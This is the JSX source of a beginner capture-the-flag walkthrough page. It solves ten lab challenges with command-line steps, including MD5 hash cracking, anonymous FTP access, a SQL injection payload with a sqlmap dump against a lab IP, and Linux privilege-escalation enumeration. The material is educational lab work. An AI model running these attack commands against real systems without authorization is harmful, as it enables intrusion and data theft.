import GuideLayout from '@/components/GuideLayout';
export default function CTFWalkthroughPage() {
  return (
    <GuideLayout
      title="CTF Walkthrough – 10 Beginner Challenges Solved"
      description="Solve 10 beginner CTF challenges step by step. Covers file discovery, Base64 decoding, XOR cipher, steganography, hash cracking, FTP exploitation, and privilege escalation."
      timeToRead="40 min read" lastUpdated="September 2026"
      tags={['CTF','Beginner','Wargames','PicoCTF']}
      tools={[{name:'Hash Generator',url:'/tools/hash-generator'},{name:'Base64 Encoder/Decoder',url:'/tools/base64-converter'},{name:'JWT Decoder',url:'/tools/jwt-inspector'}]}
      relatedGuides={[{title:'Kali Linux Pentesting',url:'/guides/kali-linux-pentesting-tutorial'},{title:'Python Security Scripts',url:'/guides/python-cybersecurity-scripts'},{title:'SQL Injection Tutorial',url:'/guides/sql-injection-tutorial'}]}
      headings={[{id:'what',label:'What is CTF?'},{id:'platforms',label:'Free Platforms'},{id:'challenges',label:'10 Challenges'},{id:'tools-list',label:'Essential Tools'}]}
    >
      <h2 id="what">What is CTF (Capture The Flag)?</h2>
      <p>CTF competitions are cybersecurity challenges where participants solve puzzles to find hidden &quot;flags&quot; — usually strings like <code>FLAG&#123;h1dd3n_s3cr3t&#125;</code>. They cover cryptography, web exploitation, reverse engineering, forensics, and more.</p>

      <h2 id="platforms">Free CTF Platforms</h2>
      <table>
        <thead><tr><th>Platform</th><th>Link</th><th>Difficulty</th></tr></thead>
        <tbody>
          <tr><td>PicoCTF</td><td><a href="https://picoctf.org/" target="_blank" rel="noopener noreferrer">picoctf.org</a></td><td>Beginner ⭐</td></tr>
          <tr><td>TryHackMe</td><td><a href="https://tryhackme.com/" target="_blank" rel="noopener noreferrer">tryhackme.com</a></td><td>Beginner–Intermediate ⭐⭐</td></tr>
          <tr><td>OverTheWire Bandit</td><td><a href="https://overthewire.org/wargames/bandit/" target="_blank" rel="noopener noreferrer">overthewire.org</a></td><td>Beginner ⭐</td></tr>
          <tr><td>HackTheBox Starting Point</td><td><a href="https://www.hackthebox.com/" target="_blank" rel="noopener noreferrer">hackthebox.com</a></td><td>Beginner–Advanced ⭐⭐⭐</td></tr>
          <tr><td>CTFtime</td><td><a href="https://ctftime.org/" target="_blank" rel="noopener noreferrer">ctftime.org</a></td><td>All levels</td></tr>
        </tbody>
      </table>

      <h2 id="challenges">10 Beginner Challenges – Solved</h2>

      <h3>Challenge 1: Find the Hidden File</h3>
      <pre><code>{`$ ls -la /home/user/
# Look for files starting with . (hidden)
$ cat .hidden_flag
FLAG{h1dd3n_f1l3s_ar3_3asy}`}</code></pre>

      <h3>Challenge 2: Decode Base64</h3>
      <pre><code>{`Given: VGhpcyBpcyB0aGUgZmxhZyE=

$ echo "VGhpcyBpcyB0aGUgZmxhZyE=" | base64 -d
This is the flag!

# Or use our tool: /tools/base64-converter`}</code></pre>

      <h3>Challenge 3: Reverse the String</h3>
      <pre><code>{`Given: }galf_eht_si_sihT{GALF

$ echo "}galf_eht_si_sihT{GALF" | rev
FLAG{This_is_the_flag}`}</code></pre>

      <h3>Challenge 4: Find Flag in a Large File</h3>
      <pre><code>{`$ grep -i "flag{" bigfile.txt
$ strings bigfile.bin | grep -i "flag{"
$ grep -r "FLAG" /home/user/ 2>/dev/null`}</code></pre>

      <h3>Challenge 5: XOR Cipher Decode</h3>
      <pre><code>{`# Given bytes and key, XOR each byte with the key
$ python3 -c "
data = [0x53, 0x68, 0x61, 0x64, 0x6f, 0x77]
key = 0x42
result = ''.join(chr(b ^ key) for b in data)
print(result)
"
# Output: Shadow`}</code></pre>

      <h3>Challenge 6: Crack a Password Hash</h3>
      <pre><code>{`Given hash: 5f4dcc3b5aa765d61d8327deb882cf99

# Identify hash type first
hash-identifier 5f4dcc3b5aa765d61d8327deb882cf99
# MD5

# Crack it
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=rockyou.txt --format=raw-md5 hash.txt

# Or check our Hash Generator to verify
# → /tools/hash-generator`}</code></pre>

      <h3>Challenge 7: FTP Anonymous Login</h3>
      <pre><code>{`# Scan to confirm FTP port is open
nmap -sV -p 21 192.168.56.10

# Connect with anonymous credentials
ftp 192.168.56.10
# Username: anonymous
# Password: (press Enter)

ftp> ls -la
ftp> get flag.txt
ftp> quit
cat flag.txt`}</code></pre>

      <h3>Challenge 8: Steganography (Flag in Image)</h3>
      <pre><code>{`# Install steghide
sudo apt install steghide

# Extract hidden data (no passphrase)
steghide extract -sf image.jpg -p ""

# Check file for embedded files
binwalk image.png

# PNG steganography tool
zsteg image.png

# Check metadata
exiftool image.jpg | grep -i "comment\|flag"`}</code></pre>

      <h3>Challenge 9: Web SQL Injection</h3>
      <pre><code>{`# Test for SQLi manually
curl "http://192.168.56.10/login?user=admin'--"

# Automated with sqlmap
sqlmap -u "http://192.168.56.10/login?user=admin" --batch --dump`}</code></pre>

      <h3>Challenge 10: Linux Privilege Escalation</h3>
      <pre><code>{`# Check current user
whoami
id

# Check sudo permissions
sudo -l

# If you can run any command as root:
sudo su
cat /root/flag.txt
FLAG{r00t_acc3ss_g41n3d}

# Other escalation vectors:
find / -perm -4000 -type f 2>/dev/null  # SUID binaries
cat /etc/crontab                         # Cron jobs`}</code></pre>

      <h2 id="tools-list">Essential CTF Tools</h2>
      <ul>
        <li><strong>CyberChef</strong> — <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreferrer">gchq.github.io/CyberChef</a> — Encode/decode/analyse anything</li>
        <li><strong>Base64/Hex/ROT13</strong> — <a href="/tools/base64-converter">Our Base64 Tool →</a></li>
        <li><strong>Hash identifier + cracker</strong> — <a href="/tools/hash-generator">Hash Generator →</a></li>
        <li><strong>Strings/binwalk/steghide</strong> — For binary/image challenges</li>
        <li><strong>Wireshark/tshark</strong> — For PCAP analysis challenges</li>
        <li><strong>sqlmap/Burp Suite</strong> — For web challenges</li>
      </ul>
    </GuideLayout>
  );
}
